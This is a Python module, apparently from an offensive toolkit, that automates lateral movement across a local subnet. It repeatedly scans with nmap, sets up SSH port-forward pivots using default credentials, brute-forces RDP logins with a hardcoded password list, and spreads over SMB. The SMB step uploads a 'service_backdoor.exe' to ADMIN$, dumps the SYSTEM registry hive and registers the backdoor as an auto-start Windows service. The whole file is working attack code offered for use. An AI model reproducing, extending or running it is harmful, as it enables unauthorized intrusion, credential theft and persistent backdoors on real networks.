import json
import random
import subprocess
import threading
import traceback
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import paramiko
import nmap
from impacket.smbconnection import SMBConnection, SessionError
from impacket.examples.secretsdump import RemoteOperations

from modules.logger import log_event
from modules.config import load_config

cfg = load_config()
SSH_CFG = cfg.get("exploits", {}).get("ssh", {})
SMB_CFG = cfg.get("exploits", {}).get("smb", {})
CREDENTIALS = cfg.get("exploits", {}).get("cred_list", [{"user": "Administrator", "pass": "Password123"}])
LATERAL_THREADS = cfg.get("lateral", {}).get("max_threads", 10)
LOCK = threading.Lock()

def ssh_pivot(target: str, remote_port: int = 3389, local_port: int = None, ssh_user=None, ssh_pass=None):
    lp = local_port or random.randint(20000, 30000)
    su = ssh_user or SSH_CFG.get("username", "root")
    sp = ssh_pass or SSH_CFG.get("password", "toor")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, username=su, password=sp, timeout=10)
        transport = client.get_transport()
        transport.request_port_forward("127.0.0.1", lp, remote_addr="127.0.0.1", remote_port=remote_port)
        log_event("lateral_movement", f"SSH pivot: {target}:{remote_port} → localhost:{lp}".encode())
        return {"status": True, "local_port": lp, "msg": "Pivot established"}
    except Exception as e:
        log_event("lateral_movement", f"SSH pivot failed for {target}: {e}".encode())
        return {"status": False, "error": str(e)}

def rdp_bruteforce(target: str, port: int = 3389):
    """
    Simple RDP brute‐force using a small wordlist (hardcoded for demo).
    """
    wordlist = ["Password123", "Passw0rd!", "Admin@123"]
    for pwd in wordlist:
        try:
            # We use FreeRDP's xfreerdp in batch mode as a check
            cmd = ["xfreerdp", f"/v:{target}:{port}", f"/u:Administrator", f"/p:{pwd}", "/cert:ignore", "/timeout:5000", "+auth-only"]
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = p.communicate(timeout=10)
            if p.returncode == 0:
                log_event("lateral_movement", f"RDP brute‐force success on {target} with '{pwd}'".encode())
                return {"status": True, "password": pwd}
        except Exception:
            continue
    return {"status": False, "error": "No password found"}

def smb_spread(target: str, payload_path: str = "/opt/bismillah_repo/windows_payloads/service_backdoor.exe", service_name="BismillahSvc"):
    last_err = ""
    for cred in CREDENTIALS:
        user = cred.get("user")
        pwd = cred.get("pass")
        try:
            conn = SMBConnection(target, target, sess_port=445)
            conn.login(user, pwd, '')
            remote_name = Path(payload_path).name
            with open(payload_path, "rb") as f:
                conn.putFile("ADMIN$", remote_name, f.read)
            log_event("lateral_movement", f"[{user}] Uploaded {remote_name} to {target}".encode())

            ro = RemoteOperations(target, user, pwd, '', isRemote=True)
            ro.connect()
            ro.dumpRegistry("", r"HKLM\SYSTEM")
            # Attempt PSExec style service creation
            cmd = [
                "sc.exe", r"\\%s" % target, "create", service_name,
                "binPath=", f"\"C:\\{remote_name}\"", "start=", "auto"
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate(timeout=15)
            if proc.returncode != 0:
                raise Exception(f"Service create failed: {err.decode().strip()}")
            ro.finish()
            log_event("lateral_movement", f"[{user}] Service {service_name} created on {target}".encode())
            return {"status": True, "used_cred": f"{user}:{pwd}"}
        except SessionError as se:
            log_event("lateral_movement", f"[{user}] SMB session error on {target}: {se}".encode())
            last_err = str(se)
        except Exception as e:
            log_event("lateral_movement", f"[{user}] Error on {target}: {e}".encode())
            last_err = str(e)
    return {"status": False, "error": f"All creds failed. Last error: {last_err}"}

def lateral_loop():
    nm = nmap.PortScanner()
    subnet = cfg.get("recon", {}).get("nmap_subnet", "192.168.1.0/24")
    args = cfg.get("recon", {}).get("nmap_args", "-p 1-65535 --open -T4 -sV -sC")
    log_event("lateral_movement", f"Starting lateral_loop on {subnet} with args '{args}'".encode())

    while True:
        try:
            scan = nm.scan(hosts=subnet, arguments=args)
            hosts = scan.get("scan", {})
            futures = []
            with ThreadPoolExecutor(max_workers=LATERAL_THREADS) as executor:
                for host, data in hosts.items():
                    ports = data.get("tcp", {})
                    if 22 in ports and ports[22]["state"] == "open":
                        futures.append(executor.submit(ssh_pivot, host))
                    if 3389 in ports and ports[3389]["state"] == "open":
                        futures.append(executor.submit(rdp_bruteforce, host))
                    if 445 in ports and ports[445]["state"] == "open":
                        payload = cfg.get("windows_payload", {}).get("service_backdoor_path", "/opt/bismillah_repo/windows_payloads/service_backdoor.exe")
                        futures.append(executor.submit(smb_spread, host, payload))
                for future in as_completed(futures):
                    res = future.result()
                    if res.get("status"):
                        log_event("lateral_movement", f"Lateral action succeeded: {res}".encode())
                    else:
                        log_event("lateral_movement", f"Lateral action failed: {res}".encode())
        except Exception as e:
            log_event("lateral_movement", f"Lateral loop error: {e}".encode())
        time.sleep(300)
